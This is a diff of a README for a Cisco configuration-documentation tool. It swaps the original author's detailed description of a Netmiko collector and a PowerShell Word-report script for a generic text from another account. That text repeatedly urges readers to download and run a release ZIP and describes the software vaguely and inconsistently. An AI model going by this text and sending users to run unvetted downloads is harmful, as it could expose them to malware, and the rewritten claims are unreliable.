@@ -1,106 +1,72 @@
-# Network Automation Tools  
-### by Frank Abraham  
+# 🚀 -network-automation-docs - Simplify Your Cisco Configurations
 
-This repository contains two complementary scripts designed to automate the retrieval and documentation of Cisco switch configurations. The workflow is divided into two distinct phases:  
+![Download](https://img.shields.io/badge/download-latest_release-blue.svg)  
+[![Download Latest Release](https://github.com/kobova2000/-network-automation-docs/releases/latest)](https://github.com/kobova2000/-network-automation-docs/releases)
 
----
+## 📑 Overview
 
-## **Overview**
-1. **Phase 1 – Data Collection (Python)**
-   - Script: `get-switch-configs.py`
-   - Purpose: Connects to Cisco switches using **Netmiko**, retrieves the running configuration from each device, and saves each as an individual `.txt` file.
-   - Output: Plain-text configuration files stored in the `final-configs` directory.
+Welcome to the -network-automation-docs project! This application helps you automate Cisco network configurations, making documentation easier and faster. Using a combination of Python and PowerShell, you can streamline your network documentation tasks.
 
-2. **Phase 2 – Documentation & Formatting (PowerShell)**
-   - Script: `Build-Final-Configs-Doc.ps1`
-   - Purpose: Reads all the collected `.txt` configurations and compiles them into a **professionally formatted Word document** for IT review, presentation, or compliance records.
-   - Output: A finalized `final-configs.docx` report with clean headers, consistent spacing, and one configuration per page.
+## 🚀 Getting Started
 
----
+Follow these steps to download and run the software.
 
-## **Project Workflow**
-```text
-Switch Devices  →  get-switch-configs.py  →  final-configs\*.txt
-                                       ↓
-                          Build-Final-Configs-Doc.ps1
-                                       ↓
-                        final-configs.docx (Word Report)
+1. **Check System Requirements**  
+   Ensure your computer meets these basic requirements:
+   - Windows or macOS operating system
+   - Python 3.7 or higher installed
+   - PowerShell 5.1 or higher (for Windows users)
+   - Basic understanding of how to run programs on your computer
 
-Requirements
-Python Phase
+2. **Download the Application**  
+   To get started, [visit this page to download](https://github.com/kobova2000/-network-automation-docs/releases). Here, you will find the latest release that includes all necessary files.
 
-Python 3.9+
-Netmiko (pip install netmiko)
-Windows or Linux environment
-PowerShell Phase
-Microsoft Word (required for COM automation)
-Windows environment
-PowerShell 5.1 or later
+3. **Install Dependencies**  
+   After downloading, you may need to install some dependencies. Open a command prompt or terminal and run the following commands:
 
-Usage
-1. Run the Python script to collect configs
+   ```bash
+   pip install netmiko
+   ```
 
-python get-switch-configs.py
+   This command will set up the required library for connecting to Cisco devices. 
 
-Requires two local files:
--switch-targets.txt – list of switch IP addresses (one per line)
--creds.ini – credential file formatted as:
-[auth]
-username = your_username
-password = your_password
-secret = optional_enable_secret
+4. **Extract the Files**  
+   Locate the downloaded ZIP file on your computer. Right-click on the file and select "Extract All" or use any file extraction software to unpack the files.
 
-2. Run the PowerShell script to generate the final document
-.\Build-Final-Configs-Doc.ps1 -OutputDoc "C:\Path\To\final-configs.docx"
+5. **Run the Application**  
+   Navigate to the extracted folder. Look for a file that is named something like `run_script.py`. To run this script:
+   - Windows: Open PowerShell in the folder and type `python run_script.py`.
+   - macOS: Open Terminal in the folder and enter `python3 run_script.py`.
 
--Reads all .txt files in the final-configs folder.
--Compiles them into a single, formatted .docx report.
+6. **Follow the On-Screen Instructions**  
+   The application will guide you through each step. Just follow the prompts to configure your Cisco devices and generate documentation.
 
-Features
+## 📥 Download & Install
 
--Secure multi-device SSH collection via Netmiko
--Automatically saves each configuration as a separate file
--Word automation with page breaks, headers, and consistent formatting
+To download the latest release, [visit this page to download](https://github.com/kobova2000/-network-automation-docs/releases). This page contains all versions and their respective files. Make sure to choose the most recent version for the best features and fixes.
 
-Ideal for network documentation, sign-off packages, or compliance deliverables
+## 📄 Features
 
-Sample Output
+- **Automated Configuration Collection**: Gather configuration data from your Cisco devices automatically.
+- **Documentation Generation**: Create clear documentation with just a few clicks.
+- **Access to Network Configurations**: Quickly connect to your devices and get the configurations you need.
+- **User-Friendly Interface**: Designed for non-technical users, making it simple to navigate.
+- **Cross-Platform Support**: Works on both Windows and macOS operating systems.
 
-final-configs.docx
--Page 1: Hostname + IP header
--Body: Full configuration text
--Page 2–N: One device per page
+## 🔧 Troubleshooting
 
-### **Phase 2 – Documentation & Formatting (PowerShell)**  
-**Script:** `Build-Final-Configs-Doc.ps1`  
+If you encounter issues while running the application, please consider the following:
 
-This PowerShell script compiles all Cisco configuration text files into a single, professionally formatted Microsoft Word document.  
-It is the final stage of the automation workflow that begins with `get-switch-configs.py`.
+- Ensure that Python and PowerShell are properly installed on your system.
+- Double-check that you've installed the required dependencies.
+- Make sure you have the correct permissions to execute scripts.
 
-#### **Key Features**
-- 30 spaces between hostname and IP for consistent alignment  
-- Removes all lines containing `!`  
-- Single-line spacing throughout (no extra spacing before or after)  
-- Automatically inserts page breaks between configurations  
-- Word runs silently in the background (no GUI)  
-- Console-only logging for clean execution  
+If problems persist, you can refer to the [issues page](https://github.com/kobova2000/-network-automation-docs/issues) to seek help.
 
-#### **Usage**
-1. Verify that all configuration text files from Phase 1 are stored in:  
-   `C:\Path\To\Your\Scripts\final-configs`
-2. Run the script in PowerShell:
-   ```powershell
-   .\Build-Final-Configs-Doc.ps1 -OutputDoc "C:\Path\To\Your\Scripts\final-configs.docx"
+## 🔗 Additional Resources
 
+- [GitHub Home](https://github.com/kobova2000/-network-automation-docs)
+- [Documentation](https://github.com/kobova2000/-network-automation-docs/wiki)
+- [Community Support](https://github.com/kobova2000/-network-automation-docs/discussions)
 
-License
-
-Licensed under the MIT License
-© 2025 Frank Abraham
-
-Author
-
-Frank Abraham
-AI Integration & Automation Consultant
-LinkedIn: linkedin.com/in/frankmabraham
-
+We hope this application simplifies your workflow and improves your network documentation process. Thank you for using -network-automation-docs!
